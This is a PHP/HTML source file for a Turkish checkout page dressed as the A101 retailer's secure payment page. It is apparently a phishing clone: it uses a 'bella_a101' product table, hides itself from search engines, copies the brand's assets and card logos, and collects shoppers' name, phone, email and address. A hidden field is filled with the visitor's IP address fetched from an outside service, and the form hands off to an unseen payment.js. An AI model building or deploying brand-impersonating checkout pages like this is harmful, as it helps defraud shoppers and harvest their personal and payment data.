
<?php

// Session start
session_start();
ob_start();
$userIP = $_SERVER['REMOTE_ADDR'];
// Check basket_info from session
if (!$_SESSION['basket'] && !isset($_SESSION['basket_info'])) {
    header('Location: index.php');
    exit;
}

// Include Helper
include_once('../inc/helper.php');

// Check product info database
$basket_info = $_SESSION['basket_info'];
$sql = "SELECT * FROM bella_a101_products WHERE id = :id";
$stmt = $db->prepare($sql);
$stmt->execute(['id' => $basket_info['product_id']]);
$product = $stmt->fetch(PDO::FETCH_OBJ);

// Check product is exist
if (!$product) {
    header('Location: index.php');
    exit;
}



?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE-EmulateIE7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta id="viewport" name="viewport"
          content="width=device-width, maximum-scale=1.0, initial-scale=1.0, user-scalable=no, minimal-ui">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">

    <title>Ödeme</title>


    <link href="assets/img/static_omnishop/ayb822/dist/style.css" rel="stylesheet" type="text/css">
    <!-- JQUERY -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <!-- Custom inline JS -->
    <script type="text/javascript">
        var GLOBALS = {
            THUMBNAIL_ACTIVE: true,
            THUMBNAIL_OPTIONS: {
                "product-list__big": {"width": 587, "quality": 60, "crop": "center", "height": 587},
                "category-detail": {"width": 870, "quality": 60, "height": 317},
                "email-thumbnail": {"width": 80, "quality": 60, "crop": "center", "height": 80},
                "product_basket_thumb_image": {"width": 120, "quality": 60, "height": 120},
                "discount-product-list": {"width": 190, "quality": 100, "crop": "center", "height": 190},
                "product-content-variant-image": {"width": 70, "quality": 60, "crop": "center", "height": 70},
                "product-detail__slider_display": {"width": 780, "quality": 60, "crop": "center", "height": 780},
                "product-detail__slider_zoom": {"width": 1400, "quality": 60, "crop": "center", "height": 1400},
                "product-detail__slider_thumbnail": {"width": 150, "quality": 60, "crop": "center", "height": 150},
                "category-detail__sub-category-banner": {"width": 270, "quality": 60, "height": 335},
                "autocomplete": {"width": 40, "quality": 60, "height": 40},
                "category-detail__campaign-banner": {"width": 420, "quality": 60, "height": 210},
                "product-map-image": {"width": 60, "quality": 60, "crop": "center", "height": 60},
                "product-list": {"width": 250, "quality": 100, "crop": "center", "height": 250}
            },
            DEFAULT_COUNTRY: {'pk': 1},
            isUserLoggin: false,
            userPhone: '',
            sendTime: '',
            phoneLogin: '',
            isAutoSetShippingOption: false,
            isPaymentTabRunningFromSlug: true,
            disableAutoSelectOneAddress: true,
            userEmail: '',
            userName: '',
            userSurname: '',

            page: 'checkout'

        };
    </script>
    <link rel="stylesheet" href="path-to-css/react-phone-input-2.css">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-regular-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-bold-webfont.woff2" as="font"
          type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-extrabold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-blackcaps-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/icomoon.ttf" as="font"
          type="font/ttf" crossorigin="">
    <script src="assets/js/cookie-seal.js"></script>

</head>
<body class="page-inner address">
<section class="js-main-wrapper">

    <header class="page-checkout-header">
        <div class="container">
            <a href="#" class="logo" title="A101">
                <img loading="lazy" src="assets/img/static_omnishop/ayb822/assets/img/logo%40a101-2x.png"
                     alt="">
            </a>
            <div class="clearfix"></div>
        </div>

        <div class="page-header header visible-xs">
            <div class="page-name js-page-name">
                <a href="#" class="js-go-back" title="Geri dön">
                    <em class="icon-chevron_left"></em>
                </a>
                GÜVENLİ ÖDEME ve ONAY
            </div>
        </div>
    </header>

    <!-- Payment Section -->
    <section class="page-checkout js-page-checkout js-tab-box">
        <div class="container" style="margin-top: 10rem;">
            <div class="checkout-addresses js-tab-content active">
                <div class="row">
                    <div class="col-sm-3 hidden-lg">
                        <div class="checkout-notice">
                            Faturanız elektronik fatura olarak iletilecektir.
                        </div>
                        <div class="checkout-sidebar">
                            <div class="js-checkout-sum-wrapper">
                                <div class="title">
                                    SİPARİŞ ÖZETİ
                                    <span>1 Ürün</span>
                                </div>
                                <div class="products">
                                    <ul>
                                        <li>
                                            <a href="/sadece-online-ozel/urun.php?s=<?= $product->ProductSefURL; ?>&i=<?= $product->id; ?>"
                                               rel="nofollow" title="<?= $product->ProductName; ?>">
                                                <img loading="lazy"
                                                     src="assets/img/products/<?= $product->ImageURL; ?>">
                                                <div class="content">
                                                    <div class="price">
                                                        ₺<?= number_format($product->ProductPrice, 2); ?>
                                                    </div>
                                                    <div><?= $product->ProductName; ?></div>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="summary">
                                    <table>
                                        <tbody>
                                        <tr>
                                            <td>
                                                Ürünlerin Toplamı
                                            </td>
                                            <td>
                                                ₺<?= number_format($product->ProductPrice, 2); ?>
                                            </td>
                                        </tr>

                                        </tbody>
                                    </table>
                                </div>

                                <div class="total">
                                    <span>
                                        ₺<?= number_format($product->ProductPrice, 2); ?>
                                    </span>
                                    Ödenecek Tutar
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-9">
                        <div class="payment-area js-payment-tab-content active" data-type="credit_card"
                             data-slug="credit_card">
                            <form class="js-tab-content js-checkout-form" method="post" id="js-checkout-form"
                                  data-amount="<?= $product->ProductPrice ?>">
                                <div class="card">
                                    <div class="section-hero">
                                        Teslimat Bilgileri
                                    </div>

                                    <div class="card-information">
                                        <div class="title">
                                            Lütfen Teslimat bilgilerinizi yazın.
                                        </div>

                                        <div class="form-area js-new-address-area">

                                            <div class="field">
                                                <label>
                                                    Ad Soyad*
                                                    <input type="text" name="name" id="name_surname" required>
                                                </label>
                                            </div>

                                            <div class="field">
                                            <label>
                                            Telefon Numarası: <br>
                                            <input required="" type="tel" id="phone_number" name="phone"  oninput="kontrolEt(this) ">
                                            <label>    
                                                <input type="hidden" id="ipAddress" name="ipAddress" value="">
                                        </div>
  
                                            <div class="field">
                                                <label>
                                                    E-Posta*
                                                    <input type="email" name="email" id="email_address" required>
                                                </label>
                                            </div>

                                         <div class="select valid--city">
    <select class="field" id="il" name="il">
        <option value="">İl Seçin</option>
        <option value="Adana">Adana</option><option value="Adıyaman">Adıyaman</option><option value="Afyonkarahisar">Afyonkarahisar</option><option value="Ağrı">Ağrı</option><option value="Amasya">Amasya</option><option value="Ankara">Ankara</option><option value="Antalya">Antalya</option><option value="Artvin">Artvin</option><option value="Aydın">Aydın</option><option value="Balıkesir">Balıkesir</option><option value="Bilecik">Bilecik</option><option value="Bingöl">Bingöl</option><option value="Bitlis">Bitlis</option><option value="Bolu">Bolu</option><option value="Burdur">Burdur</option><option value="Bursa">Bursa</option><option value="Çanakkale">Çanakkale</option><option value="Çankırı">Çankırı</option><option value="Çorum">Çorum</option><option value="Denizli">Denizli</option><option value="Diyarbakır">Diyarbakır</option><option value="Edirne">Edirne</option><option value="Elâzığ">Elâzığ</option><option value="Erzincan">Erzincan</option><option value="Erzurum">Erzurum</option><option value="Eskişehir">Eskişehir</option><option value="Gaziantep">Gaziantep</option><option value="Giresun">Giresun</option><option value="Gümüşhane">Gümüşhane</option><option value="Hakkâri">Hakkâri</option><option value="Hatay">Hatay</option><option value="Isparta">Isparta</option><option value="Mersin">Mersin</option><option value="İstanbul">İstanbul</option><option value="İzmir">İzmir</option><option value="Kars">Kars</option><option value="Kastamonu">Kastamonu</option><option value="Kayseri">Kayseri</option><option value="Kırklareli">Kırklareli</option><option value="Kırşehir">Kırşehir</option><option value="Kocaeli">Kocaeli</option><option value="Konya">Konya</option><option value="Kütahya">Kütahya</option><option value="Malatya">Malatya</option><option value="Manisa">Manisa</option><option value="Kahramanmaraş">Kahramanmaraş</option><option value="Mardin">Mardin</option><option value="Muğla">Muğla</option><option value="Muş">Muş</option><option value="Nevşehir">Nevşehir</option><option value="Niğde">Niğde</option><option value="Ordu">Ordu</option><option value="Rize">Rize</option><option value="Sakarya">Sakarya</option><option value="Samsun">Samsun</option><option value="Siirt">Siirt</option><option value="Sinop">Sinop</option><option value="Sivas">Sivas</option><option value="Tekirdağ">Tekirdağ</option><option value="Tokat">Tokat</option><option value="Trabzon">Trabzon</option><option value="Tunceli">Tunceli</option><option value="Şanlıurfa">Şanlıurfa</option><option value="Uşak">Uşak</option><option value="Van">Van</option><option value="Yozgat">Yozgat</option><option value="Zonguldak">Zonguldak</option><option value="Aksaray">Aksaray</option><option value="Bayburt">Bayburt</option><option value="Karaman">Karaman</option><option value="Kırıkkale">Kırıkkale</option><option value="Batman">Batman</option><option value="Şırnak">Şırnak</option><option value="Bartın">Bartın</option><option value="Ardahan">Ardahan</option><option value="Iğdır">Iğdır</option><option value="Yalova">Yalova</option><option value="Karabük">Karabük</option><option value="Kilis">Kilis</option><option value="Osmaniye">Osmaniye</option><option value="Düzce">Düzce</option></select>
    </select>
</div>
<br><br>
                                             

                                            <div class="field">
                                                <label>
                                                    Adres* <br>
                                                    <input class="js-address-textarea"  type="text" name="address" id="address" required>
                                                </label>
                                            </div>

                                        </div>
                                    </div>
                                </div>
                              
                                <div class="installment">
                                    <div class="section-hero hidden-xs">
                                        BİLGİLENDİRMELER
                                    </div>
                                    <div class="installment-area">
                                        <div class="agrement">
                                            <div class="checkbox">
                                                <a href="#" class="js-ajax-popup"
                                                   title="Ön Bilgilendirme Koşulları"">Ön Bilgilendirme Koşulları</a>’nı
                                                ve <a href="#"
                                                      class="js-ajax-popup" title="Uzaktan Satış Sözleşmesi">Uzaktan
                                                    Satış Sözleşmesi</a>’ni okudum ve kabul ediyorum
                                            </div>
                                        </div>

                                        <div id="js-orders-complete-button" class="js-complete-with-masterpass">
                                            <button type="submit" class="button block green continue-button"
                                                    id="payment_button">
                                                <span class="order-spinner hidden" id="order-spinner">İşleniyor.. <img
                                                            src="assets/img/static_omnishop/ayb822/assets/img/spinner.gif"
                                                            width="40" alt="spinner"></span>
                                                <span class="order-complete" id="order-complete">Siparişi Tamamla</span>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                                <div class="clearfix"></div>
                            </form>
                        </div>
                    </div>
                    <div class="col-sm-3 hidden-xs visible-lg">
                        <div class="checkout-notice">
                            Faturanız elektronik fatura olarak iletilecektir.
                        </div>
                        <div class="checkout-sidebar">
                            <div class="js-checkout-sum-wrapper">
                                <div class="title">
                                    SİPARİŞ ÖZETİ
                                    <span>1 Ürün</span>
                                </div>
                                <div class="products">
                                    <ul>
                                        <li>
                                            <a href="/sadece-online-ozel/urun.php?s=<?= $product->ProductSefURL; ?>&i=<?= $product->id; ?>"
                                               rel="nofollow" title="<?= $product->ProductName; ?>">
                                                <img loading="lazy"
                                                     src="assets/img/products/<?= $product->ImageURL; ?>">
                                                <div class="content">
                                                    <div class="price">
                                                        ₺<?= number_format($product->ProductPrice, 2); ?>
                                                    </div>
                                                    <div><?= $product->ProductName; ?></div>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="summary">
                                    <table>
                                        <tbody>
                                        <tr>
                                            <td>
                                                Ürünlerin Toplamı
                                            </td>
                                            <td>
                                                ₺<?= number_format($product->ProductPrice, 2); ?>
                                            </td>
                                        </tr>

                                        </tbody>
                                    </table>
                                </div>

                                <div class="total">
                                    <span>
                                        ₺<?= number_format($product->ProductPrice, 2); ?>
                                    </span>
                                    Ödenecek Tutar
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Payment Section End -->


    <footer class="page-checkout-footer hidden-xs">
        <ul class="cards">
            <li>
                <i class="sprite visa-logo"></i>
            </li>
            <li>
                <i class="sprite mastercard-logo"></i>
            </li>
            <li>
                <i class="sprite gpay-logo"></i>
            </li>
            <li>
                <i class="sprite bkm-logo"></i>
            </li>
            <li>
                <i class="sprite troy-logo"></i>
            </li>
        </ul>
        <p>2023 A101 Tüm Hakları Saklıdır.</p>
    </footer>


    <div class="clear"></div>
</section>


<div class="back-to-top js-back-to-top hide-on-app">
    <i class="fa fa-angle-up"></i>
</div>
 <style>
        body {
            font-family: Arial, sans-serif;
        }

        form {
            margin: 20px;
        }

        label {
            font-weight: bold;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        input[type="text"]:focus {
            outline: none;
            border: 1px solid #007BFF;
        }

        button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        /* Aşağıdaki CSS kodu giriş alanına özgüdür */
        .page-checkout .payment-area .card-information .field label input {
            width: 100%;
            height: 35px;
            padding: 0 1rem;
            margin-top: 5px;
            border: solid 1px #cbc8c8;
        }
    </style>

<style>

.modal form label textarea {
    height: 16rem;
    padding: 2rem;
}
</style>
 <script>
    $(document).ready(function() {
        // İllerin çekilmesi için bir Ajax isteği gönderin
        $.ajax({
            url: 'il_getir.php', // İlleri çeken PHP dosyanızın yolunu belirtin
            type: 'POST',
            dataType: 'json',
            success: function(data) {
                var ilSelect = $('#il');
                ilSelect.empty().append('<option value="">İl Seçin</option>');
                $.each(data, function(index, il) {
                    ilSelect.append('<option value="' + il.isim  + '">' + il.isim + '</option>');
                });
            }
        });

        // İl seçildiğinde ilçeleri çekmek için bir Ajax isteği gönderin
        $('#il').change(function() {
            var ilNo = $(this).val();
            if (ilNo !== '') {
                $.ajax({
                    url: '', // İlçeleri çeken PHP dosyanızın yolunu belirtin
                    type: 'POST',
                    data: {il_no: ilNo},
                    dataType: 'json',
                    success: function(data) {
                        var ilceSelect = $('#ilce');
                        ilceSelect.empty().append('<option value="">İlçe Seçin</option>');
                        $.each(data, function(index, ilce) {
                            ilceSelect.append('<option value="' + ilce.ilce_no + '">' + ilce.isim + '</option>');
                        });
                    }
                });
            }
        });
    });
    </script>

<script type="text/javascript">
    

// IP adresini çekmek için API URL'si
const ipApiUrl = "https://api.ipify.org?format=json";

// IP adresini çekme işlemi
fetch(ipApiUrl)
  .then((response) => response.json())
  .then((data) => {
    const ipAddress = data.ip;
    console.log("Çekilen IP Adresi: " + ipAddress);

    // IP adresini gizli bir form alanına yerleştirme
    const ipAddressField = document.getElementById("ipAddress");
    ipAddressField.value = ipAddress;

    // Formu sunucuya göndermek için burada işlem yapabilirsiniz
  })
  .catch((error) => {
    console.error("IP adresini çekerken hata oluştu: " + error);
  });


</script>
<script>
        function kontrolEt(input) {
            var telefonDegeri = input.value;

            // Eğer kullanıcı giriş alanını sadece "+90" olarak bırakmaya çalışırsa
            if (telefonDegeri === "+90") {
                return; // Mevcut değeri koru
            }

            // Eğer kullanıcı sadece "+90" ile başlayan bir numara yazarsa
            if (telefonDegeri.startsWith("+90")) {
                return; // Mevcut değeri koru
            }

            // Diğer girişleri engelle
            input.value = "+90";
        }
    </script></script>
<script src="assets/js/payment.js"></script>
</body>
</html>